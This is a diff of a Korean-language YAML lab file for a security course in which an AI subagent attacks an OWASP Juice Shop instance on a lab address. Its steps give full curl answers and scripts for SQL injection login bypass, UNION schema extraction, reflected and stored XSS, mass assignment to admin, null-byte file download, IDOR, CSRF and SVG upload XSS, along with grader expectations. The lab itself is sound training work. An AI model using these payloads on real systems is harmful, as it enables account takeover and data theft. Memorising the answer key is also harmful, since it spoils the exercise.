@@ -1,201 +1,237 @@
 lab_id: attack-ai-week04
-title: 웹 애플리케이션 공격 (Web App Attacks) - AI 지원
+title: 웹 애플리케이션 공격 (Web App Attacks) (AI 지원)
 version: ai
 course: attack-ai
 week: 4
-description: AI 에이전트를 활용하여 SQL Injection, XSS 등 웹 공격을 자동화한다. AI가 페이로드를 생성하고, 공격 결과를
-  분석하여 취약점의 심각도를 평가한다.
+description: SQL Injection, XSS, Command Injection 등 주요 웹 공격 기법을 JuiceShop 환경에서 실습한다. OWASP Top 10 취약점을 직접 공략하고, 공격 원리와 대응 방안을 학습한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
 difficulty: medium
 duration_minutes: 120
 objectives:
-- AI를 사용한 자동 SQL Injection 공격을 수행한다
-- AI가 XSS 페이로드를 생성하고 테스트하는 과정을 학습한다
-- AI 기반 웹 공격의 장점과 한계를 이해한다
+- SQL Injection의 원리를 이해하고 다양한 기법(Union, Blind, Error-based)을 실습한다
+- XSS(Reflected, Stored, DOM-based)를 실행하고 위험성을 파악한다
+- 웹 공격의 대응 방안(입력 검증, WAF, CSP)을 이해한다
 pass_threshold: 0.6
 steps:
 - order: 1
-  instruction: AI에게 JuiceShop 로그인에 SQLi를 시도하도록 요청하라.
-  hint: SQLi 자동 공격
+  instruction: JuiceShop 로그인 페이지(/rest/user/login)에 SQL Injection을 시도하라. email에 ' OR 1=1-- 페이로드를 사용하여 관리자로 로그인하라.
+  hint: POST 요청의 email 필드에 SQL Injection 페이로드를 넣는다
   category: exploit
   points: 10
-  answer: 'curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
-    application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'''
-  answer_detail: AI가 이 작업을 자동화하여 수동 대비 효율과 일관성을 높인다. CCC 증적 시스템에 결과가 자동 기록된다.
-  script: ai_sqli_login.py
+  answer: 'curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -m json.tool'
+  answer_detail: ''' OR 1=1-- 페이로드는 SQL WHERE 절을 항상 참으로 만들어 인증을 우회한다. --는 SQL 주석으로 이후 조건을 무시시킨다. DB의 첫 번째 사용자(보통 admin)로 로그인된다.'
   verify:
     type: output_contains
-    expect: result
+    expect: token
     field: stdout
+  script: 'curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -m json.tool'
+  risk_level: medium
 - order: 2
-  instruction: AI에게 JWT 토큰을 디코딩하고 분석하도록 요청하라.
-  hint: JWT 자동 분석
+  instruction: 획득한 JWT 토큰을 디코딩하여 관리자 계정의 이메일과 역할을 확인하라.
+  hint: JWT는 Base64로 인코딩된 3부분으로 구성된다. python3으로 디코딩할 수 있다
   category: analysis
   points: 10
-  answer: python3 -c "import base64,json; ...decode JWT..."
-  answer_detail: AI가 이 작업을 자동화하여 수동 대비 효율과 일관성을 높인다. CCC 증적 시스템에 결과가 자동 기록된다.
-  script: ai_jwt_decode.py
+  answer: 'curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json,base64; t=json.load(sys.stdin)[''authentication''][''token''];
+    p=t.split(''.'')[1]; p+=''=''*(-len(p)%4); print(json.loads(base64.urlsafe_b64decode(p)))"'
+  answer_detail: JWT(JSON Web Token)는 header.payload.signature 구조이다. payload를 Base64 디코딩하면 사용자 ID, 이메일, 역할(role) 등의 클레임을 확인할 수 있다. 서명 키가 없으면 변조는 불가능하다.
   verify:
     type: output_contains
-    expect: result
+    expect: email
     field: stdout
+  script: 'curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json,base64; t=json.load(sys.stdin)[''authentication''][''token''];
+    p=t.split(''.'')[1]; p+=''=''*(-len(p)%4); print(json.loads(base64.urlsafe_b64decode(p)))"'
+  risk_level: low
 - order: 3
-  instruction: AI에게 XSS 페이로드를 자동 생성하고 테스트하도록 요청하라.
-  hint: XSS 자동 테스트
+  instruction: JuiceShop의 검색 기능(/rest/products/search?q=)에 XSS 페이로드를 삽입하라. <iframe src='javascript:alert(1)'> 페이로드를 사용하라.
+  hint: 검색 쿼리에 HTML/JavaScript 코드를 삽입한다
   category: exploit
   points: 10
-  answer: curl -s 'http://10.20.30.80:3000/rest/products/search?q=<iframe%20src%3Djavascript:alert(1)>'
-  answer_detail: AI가 이 작업을 자동화하여 수동 대비 효율과 일관성을 높인다. CCC 증적 시스템에 결과가 자동 기록된다.
-  script: ai_xss_test.py
+  answer: curl -s 'http://10.20.30.80:3000/rest/products/search?q=<iframe%20src%3D%22javascript:alert(1)%22>'
+  answer_detail: Reflected XSS는 사용자 입력이 서버 응답에 그대로 반영될 때 발생한다. 공격자는 악성 스크립트가 포함된 URL을 피해자에게 전달하여 세션 탈취, 피싱 등을 수행할 수 있다.
   verify:
     type: output_contains
-    expect: result
+    expect: iframe
     field: stdout
+  script: curl -s 'http://10.20.30.80:3000/rest/products/search?q=<iframe%20src%3D%22javascript:alert(1)%22>'
+  risk_level: medium
 - order: 4
-  instruction: AI에게 Mass Assignment 취약점을 테스트하도록 요청하라.
-  hint: Mass Assignment 테스트
+  instruction: JuiceShop의 사용자 등록 API(/api/Users)를 사용하여 role을 admin으로 설정한 사용자를 등록하라. Mass Assignment 취약점을 공략하라.
+  hint: 등록 요청에 role 필드를 추가하여 전송하라
   category: exploit
   points: 10
-  answer: 'curl -s -X POST http://10.20.30.80:3000/api/Users -H ''Content-Type: application/json''
-    -d ''{"email":"ai@test.com","password":"test123","role":"admin"}'''
-  answer_detail: AI가 이 작업을 자동화하여 수동 대비 효율과 일관성을 높인다. CCC 증적 시스템에 결과가 자동 기록된다.
-  script: ai_mass_assignment.py
+  answer: 'curl -s -X POST http://10.20.30.80:3000/api/Users -H ''Content-Type: application/json'' -d ''{"email":"hacker@test.com","password":"hacker123","passwordRepeat":"hacker123","role":"admin","securityQuestion":{"id":1,"question":"test"},"securityAnswer":"test"}''
+    | python3 -m json.tool'
+  answer_detail: Mass Assignment는 서버가 클라이언트 입력을 검증 없이 객체에 바인딩할 때 발생한다. role 필드를 직접 지정하여 관리자 권한의 계정을 생성할 수 있다. OWASP A01(Broken Access Control)에 해당한다.
   verify:
     type: output_contains
-    expect: result
+    expect: email
     field: stdout
+  script: 'curl -s -X POST http://10.20.30.80:3000/api/Users -H ''Content-Type: application/json'' -d ''{"email":"hacker@test.com","password":"hacker123","passwordRepeat":"hacker123","role":"admin","securityQuestion":{"id":1,"question":"test"},"securityAnswer":"test"}''
+    | python3 -m json.tool'
+  risk_level: medium
 - order: 5
-  instruction: AI에게 UNION SQLi로 DB 스키마를 추출하도록 요청하라.
-  hint: UNION SQLi 자동화
+  instruction: JuiceShop의 /rest/products/search?q= 엔드포인트에 UNION 기반 SQL Injection을 시도하여 데이터베이스 테이블 정보를 추출하라.
+  hint: UNION SELECT와 sqlite_master를 활용하라
   category: exploit
   points: 15
   answer: curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27%29%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--'
-  answer_detail: AI가 이 작업을 자동화하여 수동 대비 효율과 일관성을 높인다. CCC 증적 시스템에 결과가 자동 기록된다.
-  script: ai_union_sqli.py
+  answer_detail: UNION 기반 SQLi는 원래 쿼리에 UNION SELECT를 추가하여 다른 테이블의 데이터를 함께 출력하는 기법이다. sqlite_master(SQLite) 또는 information_schema(MySQL)에서 테이블 구조를 조회할 수 있다.
   verify:
     type: output_contains
-    expect: result
+    expect: SELECT
     field: stdout
+  script: curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27%29%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--'
+  risk_level: medium
 - order: 6
-  instruction: AI에게 Stored XSS를 피드백 API에 삽입하도록 요청하라.
-  hint: Stored XSS 자동 삽입
+  instruction: JuiceShop의 고객 피드백(/api/Feedbacks)에 Stored XSS 페이로드를 삽입하라. comment 필드에 <script>alert('XSS')</script>를 포함하라.
+  hint: POST 요청으로 피드백을 제출하며, 관리자 토큰이 필요할 수 있다
   category: exploit
   points: 10
-  answer: 'curl -s -X POST http://10.20.30.80:3000/api/Feedbacks -H ''Content-Type:
-    application/json'' -d ''{"comment":"<script>alert(1)</script>","rating":1}'''
-  answer_detail: AI가 이 작업을 자동화하여 수동 대비 효율과 일관성을 높인다. CCC 증적 시스템에 결과가 자동 기록된다.
-  script: ai_stored_xss.py
+  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && curl -s -X POST http://10.20.30.80:3000/api/Feedbacks -H ''Content-Type: application/json'' -H "Authorization: Bearer $TOKEN" -d ''{"comment":"<script>alert(1)</script>","rating":1}'' | python3 -m
+    json.tool'
+  answer_detail: Stored XSS는 악성 스크립트가 서버에 저장되어 다른 사용자가 해당 페이지를 볼 때 실행된다. Reflected XSS보다 위험하며, 관리자 페이지에서 실행되면 관리자 세션을 탈취할 수 있다.
   verify:
     type: output_contains
-    expect: result
+    expect: comment
     field: stdout
+  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && curl -s -X POST http://10.20.30.80:3000/api/Feedbacks -H ''Content-Type: application/json'' -H "Authorization: Bearer $TOKEN" -d ''{"comment":"<script>alert(1)</script>","rating":1}'' | python3 -m
+    json.tool'
+  risk_level: medium
 - order: 7
-  instruction: AI에게 Null Byte Injection으로 파일 다운로드를 시도하도록 요청하라.
-  hint: Null Byte Injection
+  instruction: JuiceShop의 /ftp 디렉토리에서 Null Byte Injection을 사용하여 접근이 제한된 파일을 다운로드하라. package.json.bak 파일을 시도하라.
+  hint: URL에 %2500(이중 인코딩된 Null Byte)을 사용하라
   category: exploit
   points: 10
   answer: curl -s 'http://10.20.30.80:3000/ftp/package.json.bak%2500.md'
-  answer_detail: AI가 이 작업을 자동화하여 수동 대비 효율과 일관성을 높인다. CCC 증적 시스템에 결과가 자동 기록된다.
-  script: ai_null_byte.py
+  answer_detail: Null Byte Injection(%00)은 파일 확장자 검증을 우회하는 기법이다. 서버가 .md 파일만 허용할 때 filename.bak%00.md로 요청하면 확장자 검증은 .md로 통과하지만 실제로는 .bak 파일이 반환된다.
   verify:
     type: output_contains
-    expect: result
+    expect: name
     field: stdout
+  script: curl -s 'http://10.20.30.80:3000/ftp/package.json.bak%2500.md'
+  risk_level: medium
 - order: 8
-  instruction: AI에게 IDOR 취약점을 자동 테스트하도록 요청하라.
-  hint: IDOR 자동 테스트
+  instruction: JuiceShop에서 0-star 리뷰를 제출하라. rating 값을 0으로 설정하여 입력 검증 우회를 시도하라.
+  hint: API 직접 호출로 클라이언트 측 검증을 우회한다
   category: exploit
   points: 10
-  answer: 'curl -s http://10.20.30.80:3000/rest/basket/2 -H ''Authorization: Bearer
-    TOKEN'''
-  answer_detail: AI가 이 작업을 자동화하여 수동 대비 효율과 일관성을 높인다. CCC 증적 시스템에 결과가 자동 기록된다.
-  script: ai_idor_test.py
+  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && curl -s -X POST http://10.20.30.80:3000/api/Feedbacks -H ''Content-Type: application/json'' -H "Authorization: Bearer $TOKEN" -d ''{"comment":"Zero star","rating":0}'' | python3 -m json.tool'
+  answer_detail: 클라이언트 측 입력 검증(HTML5 min/max, JavaScript validation)은 API를 직접 호출하면 우회할 수 있다. 서버 측에서도 반드시 검증을 수행해야 한다.
   verify:
     type: output_contains
-    expect: result
+    expect: rating
     field: stdout
+  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && curl -s -X POST http://10.20.30.80:3000/api/Feedbacks -H ''Content-Type: application/json'' -H "Authorization: Bearer $TOKEN" -d ''{"comment":"Zero star","rating":0}'' | python3 -m json.tool'
+  risk_level: medium
 - order: 9
-  instruction: AI에게 0-star 리뷰 제출로 입력 검증 우회를 테스트하도록 요청하라.
-  hint: 입력 검증 우회
+  instruction: JuiceShop의 /rest/user/change-password 엔드포인트에서 CSRF 취약점을 확인하라. GET 요청으로 비밀번호를 변경할 수 있는지 테스트하라.
+  hint: GET 파라미터로 current, new, repeat을 전달한다
   category: exploit
   points: 10
-  answer: curl -s -X POST http://10.20.30.80:3000/api/Feedbacks -d '{"comment":"test","rating":0}'
-  answer_detail: AI가 이 작업을 자동화하여 수동 대비 효율과 일관성을 높인다. CCC 증적 시스템에 결과가 자동 기록된다.
-  script: ai_input_bypass.py
+  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && curl -s ''http://10.20.30.80:3000/rest/user/change-password?current=a&new=newpass123&repeat=newpass123'' -H "Authorization: Bearer $TOKEN" -H ''Cookie: token=''$TOKEN'
+  answer_detail: GET 요청으로 비밀번호 변경이 가능하면 CSRF 공격에 매우 취약하다. 공격자가 악성 이미지 태그(<img src=.../change-password?...>)를 삽입하면 피해자의 비밀번호가 자동으로 변경될 수 있다.
   verify:
     type: output_contains
-    expect: result
+    expect: password
     field: stdout
+  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && curl -s ''http://10.20.30.80:3000/rest/user/change-password?current=a&new=newpass123&repeat=newpass123'' -H "Authorization: Bearer $TOKEN" -H ''Cookie: token=''$TOKEN'
+  risk_level: medium
 - order: 10
-  instruction: AI에게 CSRF 취약점을 자동 테스트하도록 요청하라.
-  hint: CSRF 자동 테스트
+  instruction: JuiceShop의 /rest/basket/1 엔드포인트에 접근하여 다른 사용자의 장바구니 내용을 조회하라(IDOR 취약점).
+  hint: 다른 사용자의 basket ID를 직접 지정하여 접근한다
   category: exploit
   points: 10
-  answer: curl -s 'http://10.20.30.80:3000/rest/user/change-password?current=a&new=b&repeat=b'
-  answer_detail: AI가 이 작업을 자동화하여 수동 대비 효율과 일관성을 높인다. CCC 증적 시스템에 결과가 자동 기록된다.
-  script: ai_csrf_test.py
+  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && curl -s http://10.20.30.80:3000/rest/basket/2 -H "Authorization: Bearer $TOKEN" | python3 -m json.tool'
+  answer_detail: IDOR(Insecure Direct Object Reference)는 사용자가 URL의 ID 값을 변경하여 다른 사용자의 리소스에 접근하는 취약점이다. 서버가 요청자의 소유권을 확인하지 않으면 발생한다.
   verify:
     type: output_contains
-    expect: result
+    expect: Products
     field: stdout
+  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && curl -s http://10.20.30.80:3000/rest/basket/2 -H "Authorization: Bearer $TOKEN" | python3 -m json.tool'
+  risk_level: medium
 - order: 11
-  instruction: AI에게 관리자 패널 접근을 시도하도록 요청하라.
-  hint: 관리자 패널 접근
+  instruction: JuiceShop의 /api/Products/1 엔드포인트에 PUT 요청을 보내 제품 정보를 무단으로 수정하라.
+  hint: PUT 요청으로 제품의 description을 변경한다
   category: exploit
   points: 10
-  answer: curl -s http://10.20.30.80:3000/administration | head -30
-  answer_detail: AI가 이 작업을 자동화하여 수동 대비 효율과 일관성을 높인다. CCC 증적 시스템에 결과가 자동 기록된다.
-  script: ai_admin_access.py
+  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && curl -s -X PUT http://10.20.30.80:3000/api/Products/1 -H ''Content-Type: application/json'' -H "Authorization: Bearer $TOKEN" -d ''{"description":"Hacked by attacker"}'' | python3 -m json.tool'
+  answer_detail: API 엔드포인트에 대한 HTTP 메서드(PUT, DELETE, PATCH) 접근 제어가 미흡하면 데이터 무결성이 침해된다. 관리자만 수정 가능해야 할 리소스를 일반 사용자가 변경할 수 있는 것은 Broken Access Control이다.
   verify:
     type: output_contains
-    expect: result
+    expect: description
     field: stdout
+  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && curl -s -X PUT http://10.20.30.80:3000/api/Products/1 -H ''Content-Type: application/json'' -H "Authorization: Bearer $TOKEN" -d ''{"description":"Hacked by attacker"}'' | python3 -m json.tool'
+  risk_level: medium
 - order: 12
-  instruction: AI에게 HTTP 헤더 인젝션을 테스트하도록 요청하라.
-  hint: 헤더 인젝션
+  instruction: JuiceShop의 /profile 이미지 업로드 기능에서 파일 타입 검증을 우회하여 SVG 파일(XSS 포함)을 업로드하라.
+  hint: SVG 파일은 XML 기반이므로 JavaScript를 포함할 수 있다
   category: exploit
   points: 10
-  answer: 'curl -s http://10.20.30.80:3000/rest/saveLoginIp -H ''True-Client-IP: <script>alert(1)</script>'''
-  answer_detail: AI가 이 작업을 자동화하여 수동 대비 효율과 일관성을 높인다. CCC 증적 시스템에 결과가 자동 기록된다.
-  script: ai_header_injection.py
+  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && echo ''<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><text x="0" y="20">XSS</text></svg>'' > /tmp/xss.svg && curl -s -X POST http://10.20.30.80:3000/profile/image/file -H "Authorization:
+    Bearer $TOKEN" -H ''Cookie: token=''$TOKEN -F ''file=@/tmp/xss.svg;type=image/svg+xml'''
+  answer_detail: SVG(Scalable Vector Graphics)는 XML 기반 이미지 포맷으로, onload 이벤트 핸들러에 JavaScript를 포함할 수 있다. 파일 업로드 시 MIME 타입과 확장자 검증만으로는 이러한 공격을 막을 수 없다.
   verify:
     type: output_contains
-    expect: result
+    expect: svg
     field: stdout
+  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && echo ''<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><text x="0" y="20">XSS</text></svg>'' > /tmp/xss.svg && curl -s -X POST http://10.20.30.80:3000/profile/image/file -H "Authorization:
+    Bearer $TOKEN" -H ''Cookie: token=''$TOKEN -F ''file=@/tmp/xss.svg;type=image/svg+xml'''
+  risk_level: medium
 - order: 13
-  instruction: AI가 수행한 모든 공격의 evidence를 조회하라.
-  hint: 증적 조회
-  category: analysis
+  instruction: JuiceShop의 /rest/saveLoginIp 엔드포인트를 이용하여 HTTP 헤더 인젝션을 시도하라. X-Forwarded-For 헤더에 XSS 페이로드를 삽입하라.
+  hint: True-Client-IP 또는 X-Forwarded-For 헤더를 조작한다
+  category: exploit
   points: 10
-  answer: 'curl -s -H ''X-API-Key: ccc-api-key-2026'' http://localhost:9100/api/projects/{id}/evidence/summary'
-  answer_detail: AI가 이 작업을 자동화하여 수동 대비 효율과 일관성을 높인다. CCC 증적 시스템에 결과가 자동 기록된다.
-  script: evidence_summary.py
+  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && curl -s http://10.20.30.80:3000/rest/saveLoginIp -H "Authorization: Bearer $TOKEN" -H ''True-Client-IP: <script>alert(1)</script>'''
+  answer_detail: HTTP 헤더 값이 검증 없이 DB에 저장되고 웹 페이지에 렌더링되면 Stored XSS가 발생한다. 클라이언트가 보내는 모든 HTTP 헤더(X-Forwarded-For, True-Client-IP 등)는 신뢰할 수 없는 입력이다.
   verify:
     type: output_contains
-    expect: result
+    expect: script
     field: stdout
+  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && curl -s http://10.20.30.80:3000/rest/saveLoginIp -H "Authorization: Bearer $TOKEN" -H ''True-Client-IP: <script>alert(1)</script>'''
+  risk_level: medium
 - order: 14
-  instruction: AI에게 발견된 취약점을 OWASP Top 10으로 자동 분류하도록 요청하라.
-  hint: OWASP 자동 분류
+  instruction: JuiceShop의 관리자 패널(/administration)에 접근하라. 일반 사용자로 로그인한 상태에서 직접 URL을 입력하여 접근 가능한지 확인하라.
+  hint: 프론트엔드 라우팅만으로 접근을 제한하는 경우 URL 직접 입력으로 우회할 수 있다
+  category: exploit
+  points: 10
+  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && curl -s http://10.20.30.80:3000/administration -H "Authorization: Bearer $TOKEN" -H ''Cookie: token=''$TOKEN | head -50'
+  answer_detail: 프론트엔드(Angular/React)에서만 접근을 제한하고 백엔드 API에서 인가 검증을 하지 않으면, URL을 직접 호출하여 관리자 기능에 접근할 수 있다. 서버 측 인가가 필수적이다.
+  verify:
+    type: output_contains
+    expect: html
+    field: stdout
+  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && curl -s http://10.20.30.80:3000/administration -H "Authorization: Bearer $TOKEN" -H ''Cookie: token=''$TOKEN | head -50'
+  risk_level: medium
+- order: 15
+  instruction: 수행한 모든 웹 공격을 OWASP Top 10 카테고리별로 분류하여 /tmp/web_attack_report.txt에 정리하라.
+  hint: 각 공격이 해당하는 OWASP 카테고리를 매핑하라
   category: analysis
   points: 15
-  answer: echo 'AI OWASP Classification complete'
-  answer_detail: AI가 이 작업을 자동화하여 수동 대비 효율과 일관성을 높인다. CCC 증적 시스템에 결과가 자동 기록된다.
-  script: ai_owasp_classify.py
+  answer: 'echo -e ''=== Web Attack Report ===\n\n[A01: Broken Access Control]\n- IDOR: /rest/basket/2 접근\n- Admin panel 직접 접근\n- Mass Assignment: role=admin\n\n[A03: Injection]\n- SQL Injection: login
+    bypass\n- UNION SQLi: DB schema 추출\n- XSS: Reflected/Stored/DOM\n- Header Injection\n\n[A04: Insecure Design]\n- 0-star rating 제출\n- GET 비밀번호 변경(CSRF)\n\n[A05: Security Misconfiguration]\n- Null Byte
+    Injection으로 파일 다운로드\n- 관리자 설정 API 노출'' > /tmp/web_attack_report.txt && cat /tmp/web_attack_report.txt'
+  answer_detail: 공격 결과를 OWASP Top 10 카테고리로 분류하면 체계적인 보고서를 작성할 수 있다. 각 취약점에 대해 위험도(CVSS), 재현 절차, 영향 범위, 권장 대응 방안을 포함하는 것이 전문적인 보고서의 요건이다.
   verify:
     type: output_contains
-    expect: result
+    expect: Web Attack Report
     field: stdout
-- order: 15
-  instruction: 웹 공격 완료 보고서를 CCC API로 생성하라.
-  hint: 완료 보고서
-  category: analysis
-  points: 10
-  answer: 'curl -s -X POST http://localhost:9100/api/projects/{id}/completion-report -H
-    ''Content-Type: application/json'' -H ''X-API-Key: ccc-api-key-2026'' -d ''{"summary":"웹
-    공격 실습 완료","outcome":"success"}'''
-  answer_detail: AI가 이 작업을 자동화하여 수동 대비 효율과 일관성을 높인다. CCC 증적 시스템에 결과가 자동 기록된다.
-  script: completion_report.py
-  verify:
-    type: output_contains
-    expect: result
-    field: stdout
+  script: 'echo -e ''=== Web Attack Report ===\n\n[A01: Broken Access Control]\n- IDOR: /rest/basket/2 접근\n- Admin panel 직접 접근\n- Mass Assignment: role=admin\n\n[A03: Injection]\n- SQL Injection: login
+    bypass\n- UNION SQLi: DB schema 추출\n- XSS: Reflected/Stored/DOM\n- Header Injection\n\n[A04: Insecure Design]\n- 0-star rating 제출\n- GET 비밀번호 변경(CSRF)\n\n[A05: Security Misconfiguration]\n- Null Byte
+    Injection으로 파일 다운로드\n- 관리자 설정 API 노출'' > /tmp/web_attack_report.txt && cat /tmp/web_attack_report.txt'
+  risk_level: low
